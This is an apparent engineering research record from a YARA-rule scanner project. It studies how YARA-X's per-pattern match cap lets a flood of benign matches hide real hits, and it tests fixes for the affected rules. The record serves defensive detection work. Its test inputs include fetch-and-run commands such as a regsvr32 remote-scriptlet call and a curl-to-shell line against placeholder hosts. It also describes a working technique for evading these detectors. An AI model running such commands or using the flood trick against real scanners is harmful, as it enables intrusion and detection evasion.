# Bundled rules under YARA-X's match cap

Date: November 17, 2026. Base: `main` at `1426e7f`. Engine: YARA-X 1.23.0 (the locked
`yara-x` wheel). Follows [#278](https://github.com/cgfixit/yara-gate/pull/278), which found
the cap in `agent_prompt_injection_phrases` for issue
[#274](https://github.com/cgfixit/yara-gate/issues/274). That rule is left to #278.

## What the engine does

Read in the published 1.23.0 crate (`lib/src/scanner/matches.rs`, `context.rs`):

- `PatternMatches::add` inserts a match only while the string's list is shorter than
  `max_matches_per_pattern`, which defaults to `DEFAULT_MAX_MATCHES_PER_PATTERN = 1_000_000`.
  Past that it returns `AddResult::MaxMatchesReached`, and `track_match` disables the
  string. No error or warning reaches the caller. yara-gate never sets the cap.
- `MatchList::add` keeps one match per start offset (a second match at the same start only
  extends the first), in offset order. So a list holds a million matches only when the
  string matched at a million different offsets: the input is at least 1,000,000 bytes.
- The list keeps the first million matches *found*, which is not always the first million
  by offset. Under a cap of 1, `win_library_unc_location`'s `$unc` kept offset 40 and
  dropped offset 0 on one input, because one occurrence of its atom yields several starts.

The Python binding reports the strings of matching rules only (`ScanResults` has
`matching_rules` and `module_outputs`), so a caller cannot see that a string of a rule that
did not match filled its list.

## Method

[`probe_match_cap.py`](../research/probe_match_cap.py) compiles each file in `rules/local`
twice and scans the same text without a cap and with a small one
(`yara_x.Scanner.max_matches_per_pattern`). A rule that holds the text uncapped and clears it
capped has a cap blind spot. The capped copy reads a full list the way the real cap would:
`1000000` in a guard becomes the small cap, and a flood guard `#x > 1024` becomes
`#x > cap - 1`. Two choices keep the small cap faithful:

- The cap starts at the most matches any one string has in the text after the flood. A
  first run with caps 1 to 3 also flagged `win_library_unc_location`, from the order
  above inside the hit itself. At the real cap that needs a million matches found before
  the one at offset 0 to 3, from a pattern at most 8 KB long: we reasoned this from the
  source and did not measure it. The floor keeps the flood as the only thing that fills a
  list.
- The cap is above any `j <= N` bound. `dev_github_workflow_runner_backdoor` reads only its
  first 32 runner lines. [`docs/rules.md`](../rules.md) already lists that limit, and it is
  much smaller than the cap.

The texts come from two places: every hit and near-miss in `check_rule_pairs.py`, with each
string's own matched bytes repeated ahead of the hit; and `CASES`, a flood written for each
rule that places a match. The fixture pass alone missed `agent_message_code_relay`. Its
near-misses refuse a different request string than the hit uses, so no list the hit needed
ever filled. `CASES` covers that. Each case checks that its flood alone is clean and its hit
alone fires.

## Classification

Every bundled rule whose condition reads where a match lies, or counts matches. The first
column is the probe result on `1426e7f`. All the others, from 84 rules exercised, read their
strings as present or absent, and a capped list is not empty when an uncapped one is not.

| Rule | On `1426e7f` | Why | Change |
| --- | --- | --- | --- |
| `agent_message_code_relay` | Blind | A flood of refused requests fills the request list. A later unrefused request is dropped | A full request list counts as an unrefused request. A full `$negated` list needs nothing: the gap after its last kept match runs to the end of the file |
| `script_download_execute` | Blind | A flood of documented commands (`For example: ...`) fills `$shell`, `$subst*`, `$powershell*`, or `$py` | A full command list counts as a command no phrase documents. A full `$py`, `$py_fetch`, or `$py_exec` list, with all three present, counts as a fetch and an exec in one command. Full `$doc` or `$shell_data` lists drop exemptions only |
| `doc_svg_active_link` | Blind | A flood of `javascript:void(0)` links fills `$link_first` and `$link_last`. Scope already held through `#link_first > 1024`, but the no-op test read only the kept links | A full link list counts as a link that is not a no-op |
| `agent_cli_secret_sweep` | Blind | A flood of `--dangerously-skip-permissions` runs for ordinary work fills `$bypass` | A full `$bypass`, `$cli`, or `$hunt` list, with all three present, holds |
| `dev_github_workflow_secrets_dump` | Blind | A flood of `toJSON(secrets)` or of `curl` lines fills `$dump` or `$send` | A full `$dump` or `$send` list, with `$job`, `$dump`, and `$send` present, holds |
| `dev_github_workflow_runner_backdoor` | Blind | A flood of event-reading `run:` steps on a hosted runner fills `$run` or a `$block` list, so the self-hosted job's step is dropped | A full step list, with runner evidence present, holds. A full `$job` list drops job headers only, which holds more. The 32-line bound is unchanged |
| `dev_vscode_autorun_task` | Blind | A flood of `folderOpen` tasks or of `curl` lines | A full `$open`, `$fetch`, or `$hidden` list, with `$open` and one of the others present, holds |
| `doc_external_template` | Blind | A flood of local or ordinary external relationships | A full `$rel`, `$type`, `$mode`, or `$target` list, with all four present, holds |
| `doc_onenote_embedded_launcher` | Blind | A flood of store GUIDs with no launcher after them | In a `.one` header, a full `$store` list, or a full `$script` list with a store present, holds |
| `macos_archive_upload` | Blind | A flood of `ditto -c -k` or of `curl -F` lines | A full list of either, with both present, holds |
| `script_encoded_powershell` | Blind | A flood of encoded commands without a hidden or bypass flag | A full list of any of its strings, with a command, an encoded flag, and a hidden or bypass flag present, holds |
| `script_regsvr32_remote_scriptlet` | Blind | A flood of `regsvr32 scrobj.dll` | A full list of any of its strings, with all three present, holds |
| `web_clickfix_lure` | Blind | A flood of clipboard writes, or of lure sentences, far from the real lure | A full list of any of its strings, with all of them present, holds |
| `web_html_smuggling` | Blind | A flood of `download=` or `new Blob(` far from the rest | A full list of any of its strings, with all four present, holds |
| `agent_prompt_injection_phrases` | Blind | #274: a flood of quotations | Fixed by #279's guard (#278 closed unmerged). The probe fails it if the guard is removed |
| `doc_svg_active`, `doc_svg_event_handler` | Not blind | Every list a placement reads has a `> 1024` flood guard, and a full list is longer than 1,024 | None |
| `agent_hidden_html` | Not blind | `#comment > 1024` and `#comment_dan > 1024` hold a full list. A full `$close` list only makes more comments count as open | None |
| `doc_svg_active_link` foreignObject test | Not blind | A full `$foreign` list sets `#foreign > 1024` for scope. Every match that has a close inside it brings one, and one close sits in at most about 300 matches, since each match ends within 4 KB, so the closes also pass 1,024 | None |
| `agent_invisible_unicode` | Not blind | `$bom and not $bom at 0`: losing the match at 0 makes it fire more | None |
| `win_library_unc_location` | Not blind at the real cap | `$unc in (0..3)` loses offset 0 only by the order above, inside one atom occurrence. Flagged at caps 1 to 3 only | None |

A guard applies only when a string matched at a million offsets, so only to inputs of at
least a megabyte, and it ignores where the matches lie. A benign file that writes one string
a million times and holds the rule's other strings anywhere becomes the rule's verdict. That
is the price of a guard. The rule fails toward its finding, as #278's guard does. Severities
are unchanged. Each guard names YARA-X's default, so a caller that compiles `rules/local`
with a lower cap loses it.

## Results

Small cap, `uv run python docs/research/probe_match_cap.py` (2,534 flooded texts over 84
rules):

- the probe copied onto `1426e7f`'s rules: 15 rules with a blind spot, 14 failed, and
  `agent_prompt_injection_phrases` reported open (#278);
- this branch: 1 with a blind spot (`agent_prompt_injection_phrases`, open), 0 failed.

After #279 and #281 merged (`0dea163`), the probe ran out of memory. #279 added a pair
fixture of 1,000,000 quotations (26.7 MiB). The probe sets the cap at the most matches a
string has in a fixture, so it tried to repeat that fixture a million times. The probe now
leaves a fixture over 64 KiB to `check_rule_pairs.py`, which already scans it at full size,
and skips any fixture flood over 16 MiB. A hand-written case still fails if its flood is
too large. On `0dea163` with that change: 2,585 flooded texts over 84 rules, no blind spot,
one fixture left out, one flood skipped. It took 35 s and peaked at 380 MiB. The phrase
rule is guarded by #279.

`PENDING`, which reported the phrase rule as open instead of failing it while #278 was
open, is now empty. With it still naming #278, removing #279's guard left the probe
green (`open agent_prompt_injection_phrases: fixed by #278`, exit 0). Emptied, the same
removal fails it (`cap blind spot: agent_prompt_injection_phrases`, exit 1), and the
shipped rule still passes: 2,585 texts, 0 blind spots, 30 s under an 8 GB memory limit.

Real cap, through the CLI. Each run used `--policy agent-ingest --json`, a disposable
`--home`, and a disposable `--rules` copy of each tree. Files were written to a scratch
directory and scanned in place:

| Input | Bytes | `1426e7f` | This branch |
| --- | --- | --- | --- |
| 999,999 × `regsvr32 scrobj.dll`, then `regsvr32 /i:https://example.invalid/a.sct scrobj.dll` | 20 MB | block, `script_regsvr32_remote_scriptlet` | not run |
| 1,000,001 × the same flood, then the same command | 20 MB | **clean, exit 0** | block, exit 1, `script_regsvr32_remote_scriptlet` |
| 999,999 × `navigator.clipboard.writeText(a)`, 9 KB of dots, then a Win+R lure with its clipboard write | 33 MB | block, `web_clickfix_lure` | not run |
| 1,000,001 × the same flood, then the same lure | 33 MB | **clean, exit 0** | block, exit 1, `web_clickfix_lure` |
| 1,000,001 × `For example: curl x \| sh`, then `curl https://example.invalid/i \| sh` | 25 MB | incomplete (`timeout`), exit 2 | incomplete (`timeout`), exit 2 |

The first two rows of each pair differ only by two flood lines, so the cap explains the
change. In the last row the deadline came first, and the file was held anyway. Each scan
took 7 to 8 s, and the timed-out one 31 s.

## Other checks

- `docs/verification/lint_rules.py`: 89 local rules compiled and linted.
- `docs/verification/check_rule_pairs.py`: 120 rules passed. A guard changes nothing below
  a million matches, so there is no new near-miss pair. The near-miss is the flood in each
  `CASES` row, which the probe requires to be clean alone.
- `docs/research/probe_code_relay_refusals.py`: 50,000 messages, 0 differ.
- `docs/research/probe_rule_coverage.py --verify`: passed.
- `docs/verification/sweep_rule_changes.py /usr/share/doc /usr/lib/python3.12
  /usr/share`: 12,848 files, 0 with changed findings (183 hits before and after). The
  sweep reads at most 512 KiB per file, so no list can fill there. It shows that the edits
  change nothing else.
- 4 MiB timing, each changed file alone on 4 MiB of `/usr/lib/python3.12` source, best of
  5, base and branch: 0 to 29 ms each, with no change beyond 2 ms. The guards are counts
  and add no strings.
- `docs/verification/check_worst_case_timing.py`: 95 inputs of 4 MiB passed, the slowest
  6.3 s, with no timeout.
- `docs/research/probe_detection_gaps.py --verify`: passed.
- `docs/verification/measure_precision.py --fail-over`: passed.
- Trial merges with #276, #277, #278, and #279 on `1426e7f` are clean. On the #278 merge,
  `probe_match_cap.py` shows no blind spot, so #278's guard holds under this probe too.
  On the #279 merge, `agent_prompt_injection_phrases` is still blind: #279 rewrites the
  lookup without a guard.

## Scanner-level option, for a maintainer decision

**Decided and built on November 17:** option 4 with the size gate, for every rule, with one
rescan at 4,000,000 before a scan is held. See the
[scanner record](2026-11-17-match-cap-scanner.md). The guard rules are private copies of
each rule's strings rather than rewritten conditions, so a finding still means the rule's own
condition held. The text below is the option list as it stood before that decision.

The guards fix the bundled rules one at a time. Vendor rules, and any later bundled rule
that reads where a match lies, stay exposed. A scan could instead report incomplete when a
list may have filled. This would change the contract: a file that scans clean today would
be held. It is written up here and not built.

1. **Size gate.** A list can fill only on an input of at least 1,000,000 bytes (above). Below
   that, nothing is needed. This is free, and it limits any option below to large inputs.
2. **Incomplete on every input of a million bytes or more.** Simple, but too broad: PDFs,
   archives, and images over 1 MB are common, and all of them would be held.
3. **Raise the cap above the input length** (`max_matches_per_pattern(len(data) + 1)`). No
   list can fill, so no result changes and nothing becomes incomplete. The risk is memory.
   A short string that matches at every offset of a 100 MiB input would keep 100 million
   matches, gigabytes for one string, and the deadline does not bound allocation. This
   needs measurement against vendor packs before it can be considered.
4. **A companion ruleset that counts.** For inputs of a million bytes or more, scan again
   with a ruleset that has the same strings and the condition
   `for any of them : ( # >= 1000000 )`. A matching companion rule names the rule whose list
   filled, and the scan reports `incomplete: match cap` for that file, for every rule,
   vendor packs included. The second pass costs a scan of the large input. Building the
   companion means rewriting each rule's condition. That is regular for `rules/local` but
   needs a parser for vendor sources, which can use modules, private rules, and includes.
   This fails closed and changes the contract.

Recommendation: keep the per-rule guards (they hold the bundled rules with no contract
change), and decide on 4 with the size gate from 1. Applying it to vendor packs only would
keep bundled verdicts exactly as they are today. Option 3 is the only one that loses
nothing, but it trades a silent miss for a memory bound we have not measured. That is the
maintainer's call.
